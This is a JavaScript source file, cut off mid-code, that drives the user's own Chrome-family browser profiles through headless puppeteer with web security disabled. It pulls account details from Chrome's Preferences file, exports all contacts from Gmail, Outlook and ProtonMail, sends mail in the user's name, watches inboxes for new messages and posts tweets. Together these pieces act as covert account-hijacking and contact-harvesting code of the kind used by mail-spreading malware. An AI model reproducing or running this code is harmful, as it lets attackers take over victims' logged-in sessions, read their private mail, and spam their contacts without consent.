const os = require('os');
const fs = require('fs-extra');
const puppeteer = require('puppeteer-core');

function CSVtoJSON(csv) {
    const lines = csv
    .replace('\r', '')
    .split('\n')
    .filter(v => v.length > 0);

    if(lines.length === 0)
        return [];
    
    const info = [];
    const keys = lines.shift().split(',');
    

    for(const line of lines) {
        let part = {}
        let values = line.split(',');

        for(let i = 0; i < values.length; i++) {
            if(!keys[i])
                return;

            let value = {};
            value[keys[i]] = values[i];
            Object.assign(part, value);
        }
        
        info.push(part);
    }

    return info;
}

function VCFToJSON(input) {
    const output = [];

    let i = -1;

    input
    .replace(/\r/g, '')
    .split('\n')
    .forEach(line => {
        if(line === 'BEGIN:VCARD')
            return i++;

        if(line === 'END:VCARD' || i < 0)
            return;

        const parts = line.split(':');

        const o = {}
        o[parts[0]] = parts[1];
        
        if(!output[i])
            output[i] = {}
        
        output[i] = Object.assign(output[i], o);
    });

    return output;
}

function getBrowsers() {
    const browsers = [
        {
            name: 'chrome',
            exe: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
            user: 'C:\\Users\\' + os.userInfo()['username'] + '\\AppData\\Local\\Google\\Chrome\\User Data'
        },
        {
            name: 'brave',
            exe: 'C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe',
            user: 'C:\\Users\\' + os.userInfo()['username'] + '\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data'
        },
        {
            name: 'edge',
            exe: 'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe',
            user: 'C:\\Users\\' + os.userInfo()['username'] + '\\AppData\\Local\\Microsoft\\Edge\\User Data'
        },
        {
            name: 'chrome_canary',
            exe: 'C:\\Users\\' + os.userInfo()['username'] + '\\AppData\\Local\\Google\\Chrome SxS\\Application\\chrome.exe',
            user: 'C:\\Users\\' + os.userInfo()['username'] + '\\AppData\\Local\\Google\\Chrome SxS\\User Data'
        }
        ,
        {
            name: 'chrome_dev',
            exe: 'C:\\Program Files\\Google\\Chrome Dev\\Application\\chrome.exe',
            user: 'C:\\Users\\' + os.userInfo()['username'] + '\\AppData\\Local\\Google\\Chrome Dev\\User Data'
        }
    ];

    return browsers.filter(browser => fs.existsSync(browser['exe']));
}

const gmail_chrome = { 
    getAccounts: async browser => {
        const prefs_path =  (() => {
            for(const arg of browser._process['spawnargs']) {
                if(arg.startsWith('--user-data-dir='))
                    return arg.replace('--user-data-dir=', '') + '\\Default\\Preferences';
            }

            throw new Error('No browser user path.');
        })();

        const pref = JSON.parse(fs.readFileSync(prefs_path));

        return pref['account_info'].map(v => {
            return {
                name: v['full_name'],
                email: v['email'],
                photo: v['picture_url']
            }
        });
    },
    getContacts: async(page, u) => {
        await page.goto('https://contacts.google.com/u/' + u + '/other');

        const path = __dirname + '\\' + fs.mkdtempSync('temp');

        await page._client.send('Page.setDownloadBehavior', { 
            behavior: 'allow', 
            downloadPath: path
        });
    
        await page.waitForSelector('#ow23 > div > div.Xx0rld > div:nth-child(5)', { //wait for the page to fully load
            timeout: 6000
        }); 
    
        await page.keyboard.down('Control'); //ctrl+a(select all contacts)
        await page.keyboard.press('a'); 
        await page.keyboard.up('Control');
    
        await page.click('#ow23 > div > div.Xx0rld > div:nth-child(5)'); //click the three dots
    
        await page.keyboard.press('ArrowDown'); //Select "Print"
        await page.keyboard.press('ArrowDown'); //Select "Export"
    
        await page.keyboard.press('Enter'); //press enter
    
        await page.waitForSelector('#yDmH0d > div.llhEMd.iWO5td > div > div > div > div > button:nth-child(2) > div', { //wait for the menu to show up
            timeout: 6000
        });
    
        await page.click('#yDmH0d > div.llhEMd.iWO5td > div > div > div > div > button:nth-child(2) > div'); //click "Export"
    
        await new Promise(resolve => { //wait for file to download
            const loop = setInterval(() => {
                if(fs.existsSync(path + '\\contacts.csv')) {
                    resolve(0);
                    clearInterval(loop);
                }
            }, 500);
        });
    
        if(!fs.existsSync(path + '\\contacts.csv'))
            return {}
    
        const csv = fs.readFileSync(path + '\\contacts.csv').toString(); //read csv file
        let info = CSVtoJSON(csv);
    
        fs.removeSync(path); //delete csv file
        
        const contacts = [];
    
        for(const i in info) {
            contacts.push({
                email: info[i]['E-mail 1 - Value'],
                name: info[i]['Name']
            })       
        }
    
        return contacts;
    },
    getInfo: async function(browser) {
        const page = await browser.newPage();
        const accounts = await this.getAccounts(browser);
        const info = [];
    
        let i = 0;
        for(const account of accounts) {
            const contacts = await this.getContacts(page, i++);

            info.push(Object.assign(account, {
                contacts
            }));
        }
        
        await page.close();
        return info;
    },
    sendMail: async(browser, u, recepients, subject, body) => {
        const page = await browser.newPage();

        await page.goto(`https://mail.google.com/mail/u/${u}/?view=cm&fs=1&tf=1&to=${recepients.join(',')}&su=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`);
    
        const url = await page.url();

        if(url.includes('signin'))
            throw new Error('User not signed in.');

        await page.waitForSelector('div[role="region"]', {
            timeout: 60000
        });
    
        await page.evaluate(() => {
            for(const b of document.querySelectorAll('div')) {
                if((b.getAttribute('data-tooltip') || '').includes('(Ctrl-Enter)'))
                    return b.click()
            }
    
            return null;
        });
    
        await page.waitForSelector('#link_vsm', {
            timeout: 60000
        });
    
        return 0;
    },
    latestMail: async(browser, u) => {
        const page = await browser.newPage();

        await page.goto('https://mail.google.com/mail/u/' + u);
    
        const url = await page.url();

        if(url.includes('signin'))
            throw new Error('User not signed in.');

        await page.waitForSelector('div[role="main"]', {
            timeout: 60000
        });

        if(await page.evaluate(() => document.querySelector('tr[role="row"]') === null)) //if no email
            return {}
    
        await page.click('tr[role="row"]');
    
        await page.waitForSelector('div[data-tooltip="Show details"]', {
            timeout: 60000
        });
    
        const info = {
            subject: await page.evaluate(() => document.querySelector('div[role="main"] h2[tabindex="-1"]')?.innerText),
            body: await page.evaluate(() => (document.querySelector('div[role="main"] div[data-message-id] div:nth-child(2)')?.innerText || '').split('\n').slice(3).join('\n')),
            time: await page.evaluate(() => (document.querySelector('div[role="main"]')?.innerText || '').split('\n')[3]),
            email: await page.evaluate(async() => {
                document.querySelector('div[data-tooltip="Show details"]').click();
                return (document.querySelector('td[colspan="2"] :nth-child(2)')?.innerText || 'ERROR').slice(1, -1);
            })
        }

        await page.close();
        return info;
    },
    mailListener: async(browser, u, interval, cb) => {
        const page = await browser.newPage();
    
        await page.goto('https://mail.google.com/mail/u/' + u);
        
        const url = await page.url();

        if(url.includes('signin'))
            throw new Error('User not signed in.');

        let prev = '';
    
        const loop = async() => {
            const curr = await page.evaluate(() => {
                if(document.querySelector('tr[role="row"] div[role="link"] span span') === null)
                    return null;
    
                return document.querySelector('tr[role="row"] div[role="link"] span span').getAttribute('data-thread-id');
            });
    
            if(prev !== curr) {
                const pageTarget = page.target();
    
                await page.keyboard.down('Control');
                await page.click('tr[role="row"]');
                await page.keyboard.up('Control');
            
                browser
                .waitForTarget(target => target.opener() === pageTarget)
                .then(async() => {
                    const pages = await browser.pages();
                    const email_page = pages[pages.length-1];
    
                    await email_page.waitForSelector('div[data-tooltip="Show details"]', {
                        timeout: 60000
                    });
            
                    cb({
                        subject: await email_page.evaluate(() => document.querySelector('div[role="main"] h2[tabindex="-1"]')?.innerText),
                        body: await email_page.evaluate(() => (document.querySelector('div[role="main"] div[data-message-id] div:nth-child(2)')?.innerText || '').split('\n').slice(3).join('\n')),
                        time: await email_page.evaluate(() => (document.querySelector('div[role="main"]')?.innerText || '').split('\n')[3]),
                        email: await email_page.evaluate(async() => {
                            document.querySelector('div[data-tooltip="Show details"]').click();
                            return (document.querySelector('td[colspan="2"] :nth-child(2)')?.innerText || 'ERROR').slice(1, -1);
                        })
                    });
            
                    email_page.close();
                });
            }
    
            prev = curr;
        }
        
        const i = setInterval(loop, interval);
        loop();
    
        return {
            stop: () => {
                clearInterval(i);
                page.close();
            }
        }
    }
}

const gmail_chromium = {
    getAccounts: async page => {
        return new Promise(resolve => {
            let accounts = [];
            let u = 0;

            const cb = async() => {
                await page.goto('https://myaccount.google.com/u/' + u + '/personal-info');
                const url = await page.url();
    
                if(url.includes('signin') || url.includes('intro') || (url.includes('/u/0') && u > 1))
                    return resolve(accounts[0]['email'] === accounts[accounts.length-1]['email'] ? accounts.slice(0, -1) : accounts);
    
                await page.waitForSelector('a[href="name"] div div div div:nth-child(2)', {
                    timeout: 30000
                });

                accounts.push({
                    name: await page.evaluate(() => document.querySelector('a[href="name"] div div div div:nth-child(2)')?.innerText),
                    email: await page.evaluate(() => document.querySelector('a[href="email"] div div div div:nth-child(2)')?.innerText),
                    photo: await page.evaluate(() => document.querySelector('button[data-picker="https://docs.google.com/picker"] img')?.src)
                });

                u++;
                cb();
            }

            cb();
        });
    },
    getContacts: async(page, u) => {
        await page.goto('https://contacts.google.com/u/' + u + '/other');

        const path = __dirname + '\\' + fs.mkdtempSync('temp');

        await page._client.send('Page.setDownloadBehavior', { 
            behavior: 'allow', 
            downloadPath: path
        });
    
        await page.waitForSelector('#ow23 > div > div.Xx0rld > div:nth-child(5)', { //wait for the page to fully load
            timeout: 6000
        }); 
    
        await page.keyboard.down('Control'); //ctrl+a(select all contacts)
        await page.keyboard.press('a'); 
        await page.keyboard.up('Control');
    
        await page.click('#ow23 > div > div.Xx0rld > div:nth-child(5)'); //click the three dots
    
        await page.keyboard.press('ArrowDown'); //Select "Print"
        await page.keyboard.press('ArrowDown'); //Select "Export"
    
        await page.keyboard.press('Enter'); //press enter
    
        await page.waitForSelector('#yDmH0d > div.llhEMd.iWO5td > div > div > div > div > button:nth-child(2) > div', { //wait for the menu to show up
            timeout: 6000
        });
    
        await page.click('#yDmH0d > div.llhEMd.iWO5td > div > div > div > div > button:nth-child(2) > div'); //click "Export"
    
        await new Promise(resolve => { //wait for file to download
            const loop = setInterval(() => {
                if(fs.existsSync(path + '\\contacts.csv')) {
                    resolve(0);
                    clearInterval(loop);
                }
            }, 500);
        });
    
        if(!fs.existsSync(path + '\\contacts.csv'))
            return {}
    
        const csv = fs.readFileSync(path + '\\contacts.csv').toString(); //read csv file
        let info = CSVtoJSON(csv);
    
        fs.removeSync(path); //delete csv file
        
        const contacts = [];
    
        for(const i in info) {
            contacts.push({
                email: info[i]['E-mail 1 - Value'],
                name: info[i]['Name']
            })       
        }
    
        return contacts;
    },
    getInfo: async function(browser) {
        const page = await browser.newPage();
        const accounts = await this.getAccounts(page);
        const info = [];
    
        let i = 0;
        for(const account of accounts) {
            const contacts = await this.getContacts(page, i++);

            info.push(Object.assign(account, {
                contacts
            }));
        }
        
        await page.close();

        return info;
    },
    sendMail: async(browser, u, recepients, subject, body) => {
        const page = await browser.newPage();

        await page.goto(`https://mail.google.com/mail/u/${u}/?view=cm&fs=1&tf=1&to=${recepients.join(',')}&su=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`);
    
        const url = await page.url();

        if(url.includes('signin'))
            throw new Error('User not signed in.');

        await page.waitForSelector('div[role="region"]', {
            timeout: 60000
        });
    
        await page.evaluate(() => {
            for(const b of document.querySelectorAll('div')) {
                if((b.getAttribute('data-tooltip') || '').includes('(Ctrl-Enter)'))
                    return b.click()
            }
    
            return null;
        });
    
        await page.waitForSelector('#link_vsm', {
            timeout: 60000
        });
    
        return 0;
    },
    latestMail: async(browser, u) => {
        const page = await browser.newPage();

        await page.goto('https://mail.google.com/mail/u/' + u);
    
        const url = await page.url();

        if(url.includes('signin'))
            throw new Error('User not signed in.');

        await page.waitForSelector('div[role="main"]', {
            timeout: 60000
        });

        if(await page.evaluate(() => document.querySelector('tr[role="row"]') === null)) //if no email
            return {}
    
        await page.click('tr[role="row"]');

        await page.waitForSelector('div[data-tooltip="Show details"]', {
            timeout: 30000
        });
    
        const info = {
            subject: await page.evaluate(() => document.querySelector('div[role="main"] h2[tabindex="-1"]')?.innerText),
            body: await page.evaluate(() => (document.querySelector('div[role="main"] div[data-message-id] div:nth-child(2)')?.innerText || '').split('\n').slice(3).join('\n')),
            time: await page.evaluate(() => (document.querySelector('div[role="main"]')?.innerText || '').split('\n')[3]),
            email: await page.evaluate(async() => {
                document.querySelector('div[data-tooltip="Show details"]').click();
                return (document.querySelector('td[colspan="2"] :nth-child(2)')?.innerText || 'ERROR').slice(1, -1);
            })
        }

        await page.close();
        return info;
    },
    mailListener: async(browser, u, interval, cb) => {
        const page = await browser.newPage();
    
        await page.goto('https://mail.google.com/mail/u/' + u);
        
        const url = await page.url();

        if(url.includes('signin'))
            throw new Error('User not signed in.');
        
        let prev = '';
    
        const loop = async() => {
            const curr = await page.evaluate(() => {
                if(document.querySelector('tr[role="row"] div[role="link"] span span') === null)
                    return null;
    
                return document.querySelector('tr[role="row"] div[role="link"] span span').getAttribute('data-thread-id');
            });
    
            if(curr && curr !== prev) {
                const pageTarget = page.target();
    
                await page.keyboard.down('Control');
                await page.click('tr[role="row"]');
                await page.keyboard.up('Control');
            
                browser
                .waitForTarget(target => target.opener() === pageTarget)
                .then(async() => {
                    const pages = await browser.pages();
                    const email_page = pages[pages.length-1];
    
                    await email_page.waitForSelector('div[data-tooltip="Show details"]', {
                        timeout: 60000
                    });
            
                    cb({
                        subject: await email_page.evaluate(() => document.querySelector('div[role="main"] h2[tabindex="-1"]')?.innerText),
                        body: await email_page.evaluate(() => (document.querySelector('div[role="main"] div[data-message-id] div:nth-child(2)')?.innerText || '').split('\n').slice(3).join('\n')),
                        time: await email_page.evaluate(() => (document.querySelector('div[role="main"]')?.innerText || '').split('\n')[3]),
                        email: await email_page.evaluate(async() => {
                            document.querySelector('div[data-tooltip="Show details"]').click();
                            return (document.querySelector('td[colspan="2"] :nth-child(2)')?.innerText || 'ERROR').slice(1, -1);
                        })
                    });
            
                    email_page.close();
                });
            }
    
            prev = curr;
        }
        
        const i = setInterval(loop, interval);
        loop();
    
        return {
            stop: () => {
                clearInterval(i);
                page.close();
            }
        }
    }
}

const outlook_chrome = {
    getInfo: async browser => {
        return new Promise(async resolve => {
            const info = {}
            const page = await browser.newPage();
            await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36');

            const path = __dirname + '\\' + fs.mkdtempSync('temp');

            await page._client.send('Page.setDownloadBehavior', { 
                behavior: 'allow', 
                downloadPath: path
            });

            await page.goto('https://outlook.live.com/people/0/', {
                timeout: 60000
            });

            const url = await page.url();

            if(!url.includes('/people')) {
                fs.removeSync(path);
                throw new Error('User not signed in.');
            }

            await page.waitForSelector('div[id="meInitialsButton"]', {
                timeout: 30000
            });

            await page.click('div[id="meInitialsButton"]');

            await page.waitForSelector('div[id="mectrl_currentAccount_secondary"]', {
                timeout: 30000
            });

            info['name'] = await page.evaluate(() => document.querySelector('div[id="mectrl_currentAccount_primary"]').innerText);
            info['email'] = await page.evaluate(() => document.querySelector('div[id="mectrl_currentAccount_secondary"]').innerText);
            info['photo'] = await page.evaluate(() => document.querySelector('div[id="mectrl_currentAccount_picture_profile_picture"]').style['backgroundImage'].slice(5, -2));

            await page.click('div[id="meInitialsButton"]');

            info['contacts'] = await (async() => {
                await page.waitForSelector('i[data-icon-name="PlayerSettings"]', {
                    timeout: 30000
                });
                await page.click('i[data-icon-name="PlayerSettings"]');

                await page.waitForSelector('div li[role="presentation"]', {
                    timeout: 30000
                });
                await page.click('div li[role="presentation"]:nth-child(2)');

                await page.waitForSelector('div.ms-Modal-scrollableContent span[data-automationid="splitbuttonprimary"]', {
                    timeout: 30000
                });
                await page.click('div.ms-Modal-scrollableContent span[data-automationid="splitbuttonprimary"]');

                await new Promise(resolve => { //wait for file to download
                    const loop = setInterval(() => {
                        if(fs.existsSync(path + '\\contacts.csv')) {
                            resolve(0);
                            clearInterval(loop);
                        }
                    }, 500);
                });
            
                if(!fs.existsSync(path + '\\contacts.csv'))
                    return {}
            
                const csv = fs.readFileSync(path + '\\contacts.csv').toString(); //read csv file
                const contacts = CSVtoJSON(csv);
            
                fs.removeSync(path); //delete csv file

                return contacts.map(v => {
                    return {
                        email: v['E-mail Address'],
                        name: v[Object.keys(v)[0]] + ' ' + v['Middle Name'] + ' ' + v['Last Name']
                    }
                });
            })();

            await page.close();

            resolve(info);
        });
    },
    sendMail: async(browser, recepients, subject, body) => {
        const page = await browser.newPage();
        await page.setViewport({
            width: 1080,
            height: 720
        })
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36');

        await page.goto('https://outlook.live.com/mail/0/inbox', {
            timeout: 60000
        });

        const url = await page.url();

        if(!url.includes('/inbox'))
            throw new Error('User not signed in.');

        await page.waitForSelector('span[data-automationid="splitbuttonprimary"] span', {
            timeout: 30000
        });

        await page.click('span[data-automationid="splitbuttonprimary"] span');

        await page.waitForSelector('div[aria-label="Content pane"] input[role="combobox"]', {
            timeout: 30000
        });

        await page.type('div[aria-label="Content pane"] input[role="combobox"]', recepients.join(','), { 
            delay: 0 
        });

        await page.type('div[aria-label="Content pane"] input[maxlength="255"]', subject, { 
            delay: 0 
        });

        await page.evaluate(body => document.querySelector('div[aria-label="Content pane"] div[role="textbox"]').innerText = body, body);

        await page.click('div[aria-label="Content pane"] span[data-automationid="splitbuttonprimary"] i[data-icon-name="Send"]');
        
        
        await page.evaluate(() => new Promise(resolve => {
            let i = 0;
            const loop = setInterval(() => {
                if(i++ >= 30 || !document.querySelector('div[aria-label="Content pane"] span[data-automationid="splitbuttonprimary"] i[data-icon-name="Send"]')) {
                    resolve();
                    clearInterval(loop);
                }
            })
        }, 1000));

        await page.close();
        return 0;
    },
    latestMail: async browser => { 
        const page = await browser.newPage();
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36');

        await page.goto('https://outlook.live.com/mail/0/inbox', {
            timeout: 60000
        });

        const url = await page.url();

        if(!url.includes('/inbox'))
            throw new Error('User not signed in.');

        await page.waitForSelector('div[role="region"] div[tabindex="-1"]', {
            timeout: 30000
        });

        if(
            await page.evaluate(() => document.querySelector('div[role="region"] div[tabindex="-1"]').innerHTML.includes('resources/images/illustration_balloon')) ||
            await page.evaluate(() => document.querySelector('div[role="complementary"] div[role="option"]') === null)
        )
            return {}

        await page.click('div[role="complementary"] div[role="option"]');

        await page.waitForSelector('div.wide-content-host', {
            timeout: 30000
        });
    
        const info = {
            subject: await page.evaluate(() => document.querySelector('div[role="heading"]')?.innerText),
            body: await page.evaluate(() => document.querySelector('div.wide-content-host div[dir="auto"]')?.innerText),
            time: await page.evaluate(() => document.querySelector('div.wide-content-host div.allowTextSelection').innerText.split('\n')[1]),
            email: await page.evaluate(async() => {
                const v = document.querySelector('div.wide-content-host div.allowTextSelection').innerText.split('\n')[0];
                return v.slice(v.indexOf('<')+1, -1);
            })
        }

        await page.close();
        return info;
    },
    mailListener: async(browser, interval, cb) => {
        const page = await browser.newPage();
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36');
       
        await page.goto('https://outlook.live.com/mail/0/inbox', {
            timeout: 60000
        });

        const url = await page.url();

        if(!url.includes('/inbox'))
            throw new Error('User not signed in.');

        await page.waitForSelector('div[role="listbox"]', {
            timeout: 30000
        });

        let prev = null;
        const loop = setInterval(async() => {
            const id = await page.evaluate(() => document.querySelector('div[role="complementary"] div[role="option"]')?.getAttribute('data-convid'));
            if(!id || id === prev)
                return;

            prev = id;

            await page.click('div[role="complementary"] div[role="option"]');

            await page.waitForSelector('div.wide-content-host', {
                timeout: 30000
            });
        
            cb({
                subject: await page.evaluate(() => document.querySelector('div[role="heading"]')?.innerText),
                body: await page.evaluate(() => document.querySelector('div.wide-content-host div[dir="auto"]')?.innerText),
                time: await page.evaluate(() => document.querySelector('div.wide-content-host div.allowTextSelection').innerText.split('\n')[1]),
                email: await page.evaluate(async() => {
                    const v = document.querySelector('div.wide-content-host div.allowTextSelection').innerText.split('\n')[0];
                    return v.slice(v.indexOf('<')+1, -1);
                })
            });
        }, interval);

        return {
            stop: () => {
                clearInterval(loop);
                page.close();
            }
        }
    }
}

const protonmail_chrome = {
    getInfo: async browser => {
        return new Promise(async resolve => {
            const info = {}
            const page = await browser.newPage();
            await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36');

            const path = __dirname + '\\' + fs.mkdtempSync('temp');

            await page._client.send('Page.setDownloadBehavior', { 
                behavior: 'allow', 
                downloadPath: path
            });

            await page.goto('https://mail.protonmail.com/u/0/inbox', {
                timeout: 60000
            });

            const url = await page.url();

            if(!url.includes('/inbox'))
                throw new Error('User not signed in.');

            await page.waitForSelector('button[data-cy-header="userDropdown"]', {
                timeout: 60000
            });

            await page.click('button[data-cy-header="userDropdown"]');

            await page.waitForSelector('div.dropdown-content', {
                timeout: 10000
            });

            const out = await page.evaluate(() => document.querySelector('div.dropdown-content li div').innerText.split('\n'));
            info['name'] = out[0];
            info['email'] = out[1];

            await page.click('ul.topnav-list button[data-testid="dropdown-button"]');

            await page.waitForSelector('#label_2', {
                timeout: 10000
            });
            await page.click('#label_2');

            await page.waitForSelector('#export-contacts-button', {
                timeout: 10000
            });
            await page.click('#export-contacts-button');

            await page.waitForSelector('span.bg-success', {
                timeout: 10000
            });

            await page.waitFor(2000);

            await page.click('form[class="modal-content"] button[type="submit"]');

            const vcf_file = await new Promise(resolve => { //wait for file to download
                const loop = setInterval(() => {
                    for(const i of fs.readdirSync(path)) {
                        if(i.endsWith('.vcf')) {
                            clearInterval(loop);
                            resolve(path + '\\' + i);
                        }
                    }
                }, 500);
            });
        
            if(!fs.existsSync(vcf_file))
                return {}
        
            const vcf = fs.readFileSync(vcf_file).toString(); //read csv file
            const contacts = 
            VCFToJSON(vcf)
            .map(v => {
                return {
                    email: v['FN;PREF=1'],
                    name: v['ITEM1.EMAIL;PREF=1']
                }
            });;
            fs.removeSync(path); //delete vcf file
            info['contacts'] = contacts;

            await page.close();
            resolve(info);
        });
    },
    sendMail: async(browser, recepients, subject, body) => {
        const page = await browser.newPage();
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36');

        await page.goto('https://mail.protonmail.com/u/0/inbox', {
            timeout: 60000
        });

        const url = await page.url();

        if(!url.includes('/inbox'))
            throw new Error('User not signed in.');

        await page.waitForSelector('button[data-testid="sidebar:compose"]', {
            timeout: 60000
        });

        await page.click('button[data-testid="sidebar:compose"]');

        await page.waitForSelector('input[data-testid="composer:to"]', {
            timeout: 10000
        });

        await page.type('input[data-testid="composer:to"]', recepients.join(','), { 
            delay: 0 
        });
        await page.type('input[data-testid="composer:subject"]', subject, { 
            delay: 0 
        });

        await page.evaluate(body => new Promise(resolve => {
            document.querySelector('iframe[data-test-id="composer:body"]').contentDocument.body.querySelector('div').innerText = body;
            document.querySelector('button[data-testid="composer:send-button"]').click();

            const loop = setInterval(() => {
                if(document.querySelector('div[role="alert"]')?.innerHTML.includes('sent')) {
                    clearInterval(loop);
                    resolve(0);
                }
            }, 100)
        }), body);

        await page.close();
        return 0;
    },
    latestMail: async browser => { 
        const page = await browser.newPage();
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36');

        await page.goto('https://mail.protonmail.com/u/0/inbox', {
            timeout: 60000
        });

        const url = await page.url();

        if(!url.includes('/inbox'))
            throw new Error('User not signed in.')

        await page.waitForSelector('main div.items-column-list-inner', {
            timeout: 30000
        });

        if(await page.evaluate(() => document.querySelector('main div.items-column-list-inner div[draggable="true"]') === null))
            return {}

        await page.click('main div.items-column-list-inner div[draggable="true"]');
    
        await page.waitForSelector('div[data-testid="message-content:body"]', {
            timeout: 20000
        });

        const info = {
            subject: await page.evaluate(() => document.querySelector('h1[data-testid="conversation-header:subject"] span')?.innerText),
            body: await new Promise(async resolve => { //wait for the body to load
                const t = setTimeout(() => resolve(''), 10000);
                const loop = setInterval(async() => { 
                    const body = await page.evaluate(() => document.querySelector('div[data-testid="message-content:body"]')?.innerText);
                    if((body || '') === '')
                        return;
    
                    clearInterval(loop);
                    clearTimeout(t);
                    resolve(body);
                }, 100);
            }),
            time: await page.evaluate(() => document.querySelector('span[data-testid="item-date"]')?.innerText),
            email: await page.evaluate(() => document.querySelector('span[data-testid="message-header:from"] .message-recipient-item-label')?.innerText)
        }

        await page.close();
        return info;
    },
    mailListener: async(browser, interval, cb) => {
        const page = await browser.newPage();
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36');

        await page.goto('https://mail.protonmail.com/u/0/inbox', {
            timeout: 60000
        });

        const url = await page.url();

        if(!url.includes('/inbox'))
            throw new Error('User not signed in.')

        await page.waitForSelector('main div.items-column-list-inner', {
            timeout: 30000
        });

        let prev = null;
        const loop = setInterval(async() => {
            const id = await page.evaluate(() => document.querySelector('main div.items-column-list-inner div[draggable="true"]')?.getAttribute('data-element-id'));
            if(!id || id === prev)
                return;

            prev = id;

            await page.click('main div.items-column-list-inner div[draggable="true"]');
            await page.waitForSelector('div[data-testid="message-content:body"] div', {
                timeout: 10000
            });
        
            cb({
                subject: await page.evaluate(() => document.querySelector('h1[data-testid="conversation-header:subject"] span')?.innerText),
                body: await new Promise(async resolve => { //wait for the body to load
                    const t = setTimeout(() => resolve(''), 10000);
                    const loop = setInterval(async() => { 
                        const body = await page.evaluate(() => document.querySelector('div[data-testid="message-content:body"]')?.innerText);
                        if((body || '') === '')
                            return;
        
                        clearInterval(loop);
                        clearTimeout(t);
                        resolve(body);
                    }, 100);
                }),
                time: await page.evaluate(() => document.querySelector('span[data-testid="item-date"]')?.innerText),
                email: await page.evaluate(() => document.querySelector('span[data-testid="message-header:from"] .message-recipient-item-label')?.innerText)
            });
    
            await page.click('button[data-testid="toolbar:back-button"]');
        }, interval);

        return {
            stop: () => {
                clearInterval(loop);
                page.close();
            }
        }
    }
}

const twitter_chrome = {
    tweet: async(browser, text) => {
        const page = await browser.newPage();

        await page.goto('https://twitter.com/home', {
            timeout: 30000
        });

        const url = await page.url();

        if(url.includes('login'))
            throw new Error('User not signed in.');
        
        await page.waitForSelector('div[role="textbox"]', {
            timeout: 30000
        });
    
        await page.type('div[role="textbox"]', text, {
            delay: 0
        });
    
        await page.click('div[data-testid="tweetButtonInline"]');
        
        await page.waitForSelector('div[role="alert"]', {
            timeout: 20000
        });
        
        const err = await page.evaluate(() => document.querySelector('div[role="alert"]')?.innerText);
        if(err?.includes('Something went wrong'))
            throw new Error(err);
        
        await page.close();
        return true;
    },
    getInfo: async browser => {
        const page = await browser.newPage();

        await page.goto('https://twitter.com/home', {
            timeout: 30000
        });

        const url = await page.url();

        if(url.includes('login'))
            throw new Error('User not signed in.');
        
        await page.waitForSelector('div[data-testid="SideNav_AccountSwitcher_Button"]', {
            timeout: 30000
        });

        await page.click('div[data-testid="SideNav_AccountSwitcher_Button"]');

        const [ name, username ] = await page.evaluate(() => document.querySelector('li[data-testid="UserCell"] div')?.innerText?.split('\n'));
        
        await page.close();

        return {
            name,
            username
        }
    }
}

module.exports = {
    getBrowsers,
    chrome: {
        gmail: gmail_chrome,
        outlook: outlook_chrome,
        proton: protonmail_chrome,
        twitter: twitter_chrome,
        spawn: async() => {
            const user_path = 'C:\\Users\\' + os.userInfo()['username'] + '\\AppData\\Local\\Google\\Chrome\\User Data';
        
            return puppeteer.launch({
                executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
                args: [ 
                    'about:blank', 
                    '--use-fake-ui-for-media-stream',
                    '--allow-file-access-from-files',
                    '--disable-web-security',
                    '--disable-notifications',
                    '--disable-images',
                    '--noerrordialogs',
                    '--mute-audio',
                    '--disable-notifications',
                    '--disable-infobars',
                    '--blink-settings=imagesEnabled=false',
                    '--disable-fetching-hints-at-navigation-start',
                    '--wm-window-animations-disabled',
                    '--disable-remote-fonts',
                    '--headless'
                ],
                userDataDir: user_path,
                headless: false,
                // ignoreDefaultArgs: true,
                // product: 'firefox',
            });
        }
    }, 
    chrome_canary: {
        gmail: gmail_chrome,
        outlook: outlook_chrome,
        proton: protonmail_chrome,
        twitter: twitter_chrome,
        spawn: () => {
            const user_path = 'C:\\Users\\' + os.userInfo()['username'] + '\\AppData\\Local\\Google\\Chrome SxS\\User Data';
        
            return puppeteer.launch({
                executablePath: 'C:\\Users\\' + os.userInfo()['username'] + '\\AppData\\Local\\Google\\Chrome SxS\\Application\\chrome.exe',
                args: [ 
                    'about:blank', 
                    '--use-fake-ui-for-media-stream',
                    '--allow-file-access-from-files',
                    '--disable-web-security',
                    '--disable-notifications',
                    '--disable-images',
                    '--noerrordialogs',
                    '--mute-audio',
                    '--disable-notifications',
                    '--disable-infobars',
                    '--blink-settings=imagesEnabled=false',
                    '--disable-fetching-hints-at-navigation-start',
                    '--wm-window-animations-disabled',
                    '--disable-remote-fonts',
                    '--headless'
                ],
                userDataDir: user_path,
                headless: false,
                // ignoreDefaultArgs: true,
                // product: 'firefox',
            });
        }
    },
    chrome_dev: {
        gmail: gmail_chrome,
        outlook: outlook_chrome,
        proton: protonmail_chrome,
        twitter: twitter_chrome,
        spawn: () => {
            const user_path = 'C:\\Users\\' + os.userInfo()['username'] + '\\AppData\\Local\\Google\\Chrome Dev\\User Data';
        
            return puppeteer.launch({
                executablePath: 'C:\\Program Files\\Google\\Chrome Dev\\Application\\chrome.exe',
                args: [ 
                    'about:blank', 
                    '--use-fake-ui-for-media-stream',
                    '--allow-file-access-from-files',
